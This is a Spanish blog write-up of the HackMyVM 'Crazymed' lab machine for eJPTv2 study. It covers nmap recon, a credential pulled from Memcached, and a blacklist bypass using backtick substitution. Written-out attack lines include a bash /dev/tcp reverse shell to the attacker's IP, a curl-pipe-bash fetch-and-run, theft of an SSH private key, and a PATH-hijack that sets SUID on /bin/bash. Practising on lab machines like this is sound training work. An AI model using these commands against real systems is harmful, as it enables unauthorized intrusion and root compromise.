---
layout: post
title: "Write Up Crazymed. "
subtitle: "eJPTv2 Track "
category: Blog
tags: [Easy,Genin,Linux,HMVM,SSH,Telnet,Reverse-Shell,Netcat,Mencached,Path-Hijacking,eJPTv2]
image:
  path: /assets/img/crazymed/crazymed.jpg
---

***

<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconnaissance

### Ping Sweep

```bash
sudo arp-scan -I ens33 --localnet
```

![list](/assets/img/crazymed/1.png){:.lead width="800" height="100" loading="lazy"}

### Nmap

Utilizando **nmap**, comprobamos qué puertos están abiertos.

```bash
nmap --open -p- -Pn -n -T4 -vvv -n 192.168.1.37 -oN allports
```

![list](/assets/img/crazymed/2.png){:.lead width="800" height="100" loading="lazy"}

***

### Services and Versions

```bash
nmap -sVC -Pn -n -p22,80 192.168.1.37 -oN target
```

![list](/assets/img/crazymed/3.1.png){:.lead width="800" height="100" loading="lazy"}


![list](/assets/img/crazymed/3.2.png){:.lead width="800" height="100" loading="lazy"}


***

## Vulnerability Analysis 

### HTTP TCP-80


Aunque tenemos dos puerto en el pueto 22 no podemos hace nada de momento, asi que nos vamos a concentrar en el puerto 80, si usamos herramientas como **whatweb** o **wappalizer**, ni tampoco **ctrl+u**., no coseguiremos nada, es hoara de revisra lo otros puertos.


![list](/assets/img/crazymed/3.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Contenido de la Web.


### Memcached TCP-11211


Es servicio Memcached, si consultamos el [Sitio-Web] oficial nos indica lo siguiente, que se trata de un sistema de almacenamiento en caché de objetos de memoria distribuida, de alto rendimiento, gratuito y de código abierto, y en la misma página oficial, nos proporcionan un ejemplo que es una pista importante.

[Sitio-Web]: https://memcached.org/


![list](/assets/img/crazymed/6.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Es un ejemplo de como conectarnos al servicio.


Consultando en google nos enteramos que hay algunas formas de conectar al servicio una um poco manual que es la de telnet y otra un poco mas automatizada que es con libmemcached-tools o metasploit.


![list](/assets/img/crazymed/11.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Con get log vemos el contenodo de log.



![list](/assets/img/crazymed/12.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
La cfedencial es cr4zyM3d.


## Netcat TCP-4444


ahora procedemos a conectarnos al servicio Netcat con **nc 192.168.1.37 4444**, e introducimos la credencial **cr4zyM3d**, esto nos dara un especie de shell pero muy restringuida ya que solo podemos ejectar 4 comados.


![list](/assets/img/crazymed/13.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Los coamdos que solo se pueden ejecutar son: **id**, **who**, **echo**, **clear**.


En este punto vamos a probar algunos comandoa para ver si podemos obtener algo yo empece con estas formas **echo $(cat /etc/passwd)** , **echo "$(cat /etc/passwd)"**, pero no pude se ve que por lo que sea las comillas y el signo de dolar estan en una black list porque te detecta el ataque pero con **echo `cat /etc/passwd`** funciona bien asi que este va hacer nuestro vector.

Lo que hice fue crear un archivo shell.sh con el contenido `bash -i >& /dev/tcp/192.168.1.32/443 0>&1` que es para mandarnos una reversa-shell, la ip es la de la maquina atacante osea la tuya y el puerto es 443 porque nos debemos poner a la escucha con netcat por otra parte tenemos que levantar un servidor con python para a la hora de subir la shell.sh con **wget** o **curl** y ejecutarlo a la vez.


![list](/assets/img/crazymed/14.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Contenido de shell.sh.


## Exploitation


Ejecutamos el comado.


```bash
echo `curl http://192.168.1.37/shell.sh | bash`
```

![list](/assets/img/crazymed/15.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Obtenemos la shell como **brad** y podemos ver la flag en su escritorio.


***

## Privilege Escalation

Hacemos ls -la para ver los archivos oculatos y exite el directorio **.ssh** donde esta la **id_rsa** que nos la vamos a copiar


![list](/assets/img/crazymed/16.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Copiamos la id_rsa recordando que debe tener los permisos adecuados **600** para conectarnos por ssh para tener unsa shell mas estable.



![list](/assets/img/crazymed/16.png){:.lead width="800" height="100" loading="lazy"}



Es muy buena practica cuando estamos enpezando a uasr herramientas como **Limpeas.sh** o/y **pspy64**, etc, para realizar un reconocimiento del servidor para ver algun posible vector para escalar privileguios.

![list](/assets/img/crazymed/18.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Limpeas nos da la ruta donde tenemos permisos de escritura.


![list](/assets/img/crazymed/19.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Pspy64 nos da el nombre del proceso del vector de ataque, en resumen, este script busca crear los archivos de bandera de usuario si no existen, establece los permisos adecuados, cambia el propietario y grupo de un directorio, evita que se registren comandos en el historial de Bash y elimina archivos de registro específicos en el directorio **/var/log**.


Perfecto, ahora entendemos cómo proceder, vamos a llevar a cabo un **Path Hijacking**, ya que hemos identificado un directorio vulnerable que ya se encuentra en la variable de entorno **PATH**.

El objetivo es secuestrar un ejecutable del sistema que utilice ese directorio, como por ejemplo chmod, chown o **find**.

Para lograr esto, crearemos un archivo llamado **find** y le daremos permisos de ejecucion y a en contenido daremos permiso SUID de la siguiente forma `chmod u+s /bin/bash` De esta manera, el ejecutará automáticamente con privilegios de root, proporcionándonos acceso root al sistema.


![list](/assets/img/crazymed/24.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
La flag esta en el escritorio de root.


***

```bash
🎉 Felicitaciones ya has comprometido Crazymed de Hack My VM 🎉
```
{:.centered}

***

Back to [Certification eJPTv2 ](2023-06-02-Road-to-eJPTv2.md){:.heading.flip-title}
{:.read-more}
